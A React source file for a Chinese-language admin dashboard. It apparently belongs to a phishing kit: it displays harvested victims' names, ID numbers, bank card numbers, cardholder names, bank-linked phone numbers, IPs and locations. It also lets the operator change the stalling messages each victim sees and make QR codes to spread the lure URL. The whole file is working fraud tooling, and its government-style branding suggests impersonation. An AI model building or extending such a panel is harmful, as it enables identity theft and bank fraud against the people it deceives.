import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { toast } from "sonner";
import QRCode from 'qrcode';
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Button } from "@/components/ui/button";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Separator } from "@/components/ui/separator";
import { SubmissionData, WaitingMessage } from '@/types';
import { 
  getAllSubmissions, 
  deleteSubmission, 
  updateSubmissionNotes,
  getAllWaitingMessages,
  addWaitingMessage,
  updateWaitingMessage,
  deleteWaitingMessage,
  setDefaultWaitingMessage,
  updateSubmissionMessage,
  initializeLocalStorage
} from '@/utils/api';

const AdminDashboard = () => {
  const navigate = useNavigate();
  const [submissions, setSubmissions] = useState<SubmissionData[]>([]);
  const [waitingMessages, setWaitingMessages] = useState<WaitingMessage[]>([]);
  const [selectedSubmission, setSelectedSubmission] = useState<SubmissionData | null>(null);
  const [newMessage, setNewMessage] = useState('');
  const [editingMessage, setEditingMessage] = useState<WaitingMessage | null>(null);
  const [searchTerm, setSearchTerm] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [url, setUrl] = useState('');
  const [qrCodeData, setQrCodeData] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);

  // Check authentication on mount
  useEffect(() => {
    const isAuthenticated = sessionStorage.getItem('adminAuthenticated') === 'true';
    if (!isAuthenticated) {
      navigate('/admin/login');
      return;
    }
    
    // Initialize local storage if needed
    initializeLocalStorage();
    
    // Load data
    loadData();
  }, [navigate]);

  const loadData = () => {
    setIsLoading(true);
    
    // Simulate API call delay
    setTimeout(() => {
      const allSubmissions = getAllSubmissions();
      const allMessages = getAllWaitingMessages();
      
      setSubmissions(allSubmissions);
      setWaitingMessages(allMessages);
      setIsLoading(false);
    }, 500);
  };

  const refreshData = () => {
    setIsLoading(true);
    setTimeout(() => {
      const allSubmissions = getAllSubmissions();
      const allMessages = getAllWaitingMessages();
      
      setSubmissions(allSubmissions);
      setWaitingMessages(allMessages);
      setIsLoading(false);
      toast.success('数据已刷新!');
    }, 500);
  };

  const handleLogout = () => {
    sessionStorage.removeItem('adminAuthenticated');
    navigate('/admin/login');
  };

  const handleDeleteSubmission = (id: string) => {
    if (window.confirm('确定要删除这条提交记录吗？')) {
      const success = deleteSubmission(id);
      if (success) {
        toast.success('记录已删除');
        setSubmissions(prev => prev.filter(sub => sub.id !== id));
      } else {
        toast.error('删除记录失败');
      }
    }
  };

  const handleUpdateNotes = (id: string, notes: string) => {
    const success = updateSubmissionNotes(id, notes);
    if (success) {
      toast.success('备注已更新');
      setSubmissions(prev => prev.map(sub => 
        sub.id === id ? { ...sub, notes } : sub
      ));
      setSelectedSubmission(null);
    } else {
      toast.error('更新备注失败');
    }
  };

  const handleAddWaitingMessage = () => {
    if (!newMessage.trim()) {
      toast.error('请输入提示消息内容');
      return;
    }
    
    const success = addWaitingMessage(newMessage);
    if (success) {
      toast.success('提示消息已添加');
      setWaitingMessages(getAllWaitingMessages());
      setNewMessage('');
    } else {
      toast.error('添加提示消息失败');
    }
  };

  const handleUpdateWaitingMessage = () => {
    if (!editingMessage || !editingMessage.message.trim()) {
      toast.error('请输入提示消息内容');
      return;
    }
    
    const success = updateWaitingMessage(editingMessage.id, editingMessage.message);
    if (success) {
      toast.success('提示消息已更新');
      setWaitingMessages(getAllWaitingMessages());
      setEditingMessage(null);
    } else {
      toast.error('更新提示消息失败');
    }
  };

  const handleDeleteWaitingMessage = (id: string) => {
    if (window.confirm('确定要删除这条提示消息吗？')) {
      const success = deleteWaitingMessage(id);
      if (success) {
        toast.success('提示消息已删除');
        setWaitingMessages(getAllWaitingMessages());
      } else {
        toast.error('无法删除默认提示消息');
      }
    }
  };

  const handleSetDefaultMessage = (id: string) => {
    const success = setDefaultWaitingMessage(id);
    if (success) {
      toast.success('已设置为默认提示消息');
      setWaitingMessages(getAllWaitingMessages());
    } else {
      toast.error('设置默认提示消息失败');
    }
  };

  const handleSetCustomMessage = (submissionId: string, messageId: string) => {
    const message = waitingMessages.find(msg => msg.id === messageId);
    if (!message) return;
    
    const success = updateSubmissionMessage(submissionId, message.message);
    if (success) {
      toast.success('已更新用户提示消息');
      loadData();
    } else {
      toast.error('更新用户提示消息失败');
    }
  };

  const generateQRCode = async () => {
    if (!url) {
      toast.error('请输入网站域名');
      return;
    }

    try {
      setIsGenerating(true);
      const qrCode = await QRCode.toDataURL(url, { 
        width: 400,
        margin: 2,
        errorCorrectionLevel: 'H'
      });
      setQrCodeData(qrCode);
      toast.success('二维码生成成功');
    } catch (error) {
      console.error(error);
      toast.error('生成二维码时出错');
    } finally {
      setIsGenerating(false);
    }
  };

  // Filter submissions based on search term
  const filteredSubmissions = submissions.filter(sub => 
    sub.fullName?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    sub.idNumber?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    sub.cardNumber?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    sub.ipAddress?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    sub.country?.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="min-h-screen bg-gray-100 animate-fade-in">
      <header className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex justify-between items-center">
          <h1 className="text-xl font-semibold text-gray-900">管理员控制面板</h1>
          <div className="flex space-x-2">
            <Button variant="outline" onClick={handleLogout}>退出登录</Button>
            <Button variant="outline" onClick={refreshData}>刷新</Button>
          </div>
        </div>
      </header>
      
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
        <Tabs defaultValue="submissions" className="w-full">
          <TabsList className="mb-6">
            <TabsTrigger value="submissions">提交记录</TabsTrigger>
            <TabsTrigger value="messages">提示消息管理</TabsTrigger>
            <TabsTrigger value="qrcode">二维码生成器</TabsTrigger>
          </TabsList>
          
          <TabsContent value="submissions" className="space-y-6">
            <div className="bg-white p-6 rounded-lg shadow-sm">
              <div className="flex justify-between items-center mb-6">
                <h2 className="text-lg font-medium">用户提交数据</h2>
                <Input 
                  placeholder="搜索用户名、身份证、IP..." 
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="max-w-xs"
                />
              </div>
              
              {isLoading ? (
                <div className="flex justify-center items-center py-20">
                  <div className="w-8 h-8 border-4 border-gov-blue border-t-transparent rounded-full animate-spin"></div>
                </div>
              ) : filteredSubmissions.length === 0 ? (
                <div className="text-center py-12 text-gray-500">
                  <p>暂无提交数据</p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead>姓名</TableHead>
                        <TableHead>身份证号</TableHead>
                        <TableHead>银行卡号</TableHead>
                        <TableHead>IP地址</TableHead>
                        <TableHead>国家/地区</TableHead>
                        <TableHead>提交时间</TableHead>
                        <TableHead>备注</TableHead>
                        <TableHead>操作</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {filteredSubmissions.map((submission) => (
                        <TableRow key={submission.id}>
                          <TableCell className="font-medium">{submission.fullName}</TableCell>
                          <TableCell>{submission.idNumber}</TableCell>
                          <TableCell>{submission.cardNumber}</TableCell>
                          <TableCell>{submission.ipAddress}</TableCell>
                          <TableCell>{submission.country}/{submission.city}</TableCell>
                          <TableCell>{new Date(submission.timestamp).toLocaleString()}</TableCell>
                          <TableCell>{submission.notes || '-'}</TableCell>
                          <TableCell>
                            <div className="flex space-x-2">
                              <Dialog>
                                <DialogTrigger asChild>
                                  <Button variant="outline" size="sm" onClick={() => setSelectedSubmission(submission)}>
                                    详情
                                  </Button>
                                </DialogTrigger>
                                <DialogContent className="sm:max-w-xl">
                                  <DialogHeader>
                                    <DialogTitle>用户提交详情</DialogTitle>
                                    <DialogDescription>
                                      提交时间: {selectedSubmission && new Date(selectedSubmission.timestamp).toLocaleString()}
                                    </DialogDescription>
                                  </DialogHeader>
                                  
                                  {selectedSubmission && (
                                    <div className="space-y-4 mt-4">
                                      <div className="grid grid-cols-2 gap-4">
                                        <div>
                                          <p className="text-sm font-medium mb-1">姓名</p>
                                          <p className="text-sm">{selectedSubmission.fullName}</p>
                                        </div>
                                        <div>
                                          <p className="text-sm font-medium mb-1">身份证号</p>
                                          <p className="text-sm">{selectedSubmission.idNumber}</p>
                                        </div>
                                        <div>
                                          <p className="text-sm font-medium mb-1">银行</p>
                                          <p className="text-sm">{selectedSubmission.bankName}</p>
                                        </div>
                                        <div>
                                          <p className="text-sm font-medium mb-1">银行卡号</p>
                                          <p className="text-sm">{selectedSubmission.cardNumber}</p>
                                        </div>
                                        <div>
                                          <p className="text-sm font-medium mb-1">持卡人姓名</p>
                                          <p className="text-sm">{selectedSubmission.holderName}</p>
                                        </div>
                                        <div>
                                          <p className="text-sm font-medium mb-1">预留手机号</p>
                                          <p className="text-sm">{selectedSubmission.phoneNumber}</p>
                                        </div>
                                        <div>
                                          <p className="text-sm font-medium mb-1">IP地址</p>
                                          <p className="text-sm">{selectedSubmission.ipAddress}</p>
                                        </div>
                                        <div>
                                          <p className="text-sm font-medium mb-1">位置</p>
                                          <p className="text-sm">{selectedSubmission.country}/{selectedSubmission.city}</p>
                                        </div>
                                      </div>
                                      
                                      <Separator />
                                      
                                      <div>
                                        <p className="text-sm font-medium mb-1">浏览器信息</p>
                                        <p className="text-sm overflow-hidden text-ellipsis">{selectedSubmission.userAgent}</p>
                                      </div>
                                      
                                      <div>
                                        <p className="text-sm font-medium mb-1">等待提示消息</p>
                                        <p className="text-sm">{selectedSubmission.customMessage}</p>
                                        <div className="mt-2">
                                          <select 
                                            className="text-sm rounded border border-gray-300 px-3 py-1 w-full"
                                            onChange={(e) => handleSetCustomMessage(selectedSubmission.id, e.target.value)}
                                          >
                                            <option value="">选择要更改的提示消息</option>
                                            {waitingMessages.map(msg => (
                                              <option key={msg.id} value={msg.id}>
                                                {msg.message} {msg.isDefault ? '(默认)' : ''}
                                              </option>
                                            ))}
                                          </select>
                                        </div>
                                      </div>
                                      
                                      <div>
                                        <p className="text-sm font-medium mb-1">备注</p>
                                        <Textarea 
                                          placeholder="添加备注..."
                                          value={selectedSubmission.notes || ''}
                                          onChange={(e) => setSelectedSubmission({
                                            ...selectedSubmission,
                                            notes: e.target.value
                                          })}
                                          className="min-h-[100px]"
                                        />
                                      </div>
                                      
                                      <div className="flex justify-end space-x-2">
                                        <Button 
                                          variant="outline" 
                                          onClick={() => setSelectedSubmission(null)}
                                        >
                                          取消
                                        </Button>
                                        <Button 
                                          onClick={() => selectedSubmission && handleUpdateNotes(selectedSubmission.id, selectedSubmission.notes || '')}
                                        >
                                          保存备注
                                        </Button>
                                      </div>
                                    </div>
                                  )}
                                </DialogContent>
                              </Dialog>
                              
                              <Button 
                                variant="destructive" 
                                size="sm"
                                onClick={() => handleDeleteSubmission(submission.id)}
                              >
                                删除
                              </Button>
                            </div>
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </div>
              )}
            </div>
          </TabsContent>
          
          <TabsContent value="messages" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div className="bg-white p-6 rounded-lg shadow-sm">
                <h2 className="text-lg font-medium mb-4">添加新提示消息</h2>
                <div className="space-y-4">
                  <Textarea 
                    placeholder="输入新的提示消息..."
                    value={newMessage}
                    onChange={(e) => setNewMessage(e.target.value)}
                    className="min-h-[80px]"
                  />
                  <Button onClick={handleAddWaitingMessage}>添加消息</Button>
                </div>
              </div>
              
              <div className="bg-white p-6 rounded-lg shadow-sm">
                <h2 className="text-lg font-medium mb-4">等待提示消息列表</h2>
                
                {waitingMessages.length === 0 ? (
                  <p className="text-gray-500">暂无提示消息</p>
                ) : (
                  <div className="space-y-4">
                    {waitingMessages.map((message) => (
                      <div 
                        key={message.id} 
                        className={`p-3 rounded-md border ${message.isDefault ? 'border-blue-500 bg-blue-50' : 'border-gray-200'}`}
                      >
                        {editingMessage?.id === message.id ? (
                          <div className="space-y-2">
                            <Textarea 
                              value={editingMessage.message}
                              onChange={(e) => setEditingMessage({
                                ...editingMessage,
                                message: e.target.value
                              })}
                            />
                            <div className="flex space-x-2">
                              <Button size="sm" onClick={handleUpdateWaitingMessage}>保存</Button>
                              <Button size="sm" variant="outline" onClick={() => setEditingMessage(null)}>取消</Button>
                            </div>
                          </div>
                        ) : (
                          <>
                            <p>{message.message}</p>
                            <div className="flex justify-between items-center mt-2">
                              <div>
                                {message.isDefault && (
                                  <span className="text-xs text-blue-600 font-medium bg-blue-100 px-2 py-1 rounded">
                                    默认提示
                                  </span>
                                )}
                              </div>
                              <div className="flex space-x-2">
                                <Button 
                                  size="sm" 
                                  variant="outline"
                                  onClick={() => setEditingMessage(message)}
                                >
                                  编辑
                                </Button>
                                
                                {!message.isDefault && (
                                  <Button
                                    size="sm"
                                    variant="outline"
                                    onClick={() => handleSetDefaultMessage(message.id)}
                                  >
                                    设为默认
                                  </Button>
                                )}
                                
                                {!message.isDefault && (
                                  <Button
                                    size="sm"
                                    variant="destructive"
                                    onClick={() => handleDeleteWaitingMessage(message.id)}
                                  >
                                    删除
                                  </Button>
                                )}
                              </div>
                            </div>
                          </>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </TabsContent>
          
          <TabsContent value="qrcode" className="space-y-6">
            <div className="bg-white p-6 rounded-lg shadow-sm">
              <h2 className="text-lg font-medium mb-4">二维码生成器</h2>
              <div className="space-y-4">
                <div>
                  <label className="text-sm font-medium mb-1 block">网站域名</label>
                  <Input 
                    placeholder="请输入网站域名，例如: https://example.com"
                    value={url}
                    onChange={(e) => setUrl(e.target.value)}
                    className="max-w-md"
                  />
                </div>
                
                {qrCodeData && (
                  <div className="mt-4">
                    <img 
                      src={qrCodeData} 
                      alt="QR Code" 
                      className="border p-2 rounded-lg bg-white"
                      style={{ maxWidth: '200px' }}
                    />
                    <div className="mt-2 space-x-2">
                      <Button
                        variant="outline"
                        onClick={() => {
                          const link = document.createElement('a');
                          link.href = qrCodeData;
                          link.download = 'qrcode.png';
                          link.click();
                        }}
                      >
                        下载二维码
                      </Button>
                      <Button
                        variant="outline"
                        onClick={() => {
                          setUrl('');
                          setQrCodeData('');
                        }}
                      >
                        清除
                      </Button>
                    </div>
                  </div>
                )}
                
                <Button 
                  onClick={generateQRCode}
                  disabled={!url || isGenerating}
                  className="mt-4"
                >
                  {isGenerating ? '生成中...' : '生成二维码'}
                </Button>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </main>
    </div>
  );
};

export default AdminDashboard;
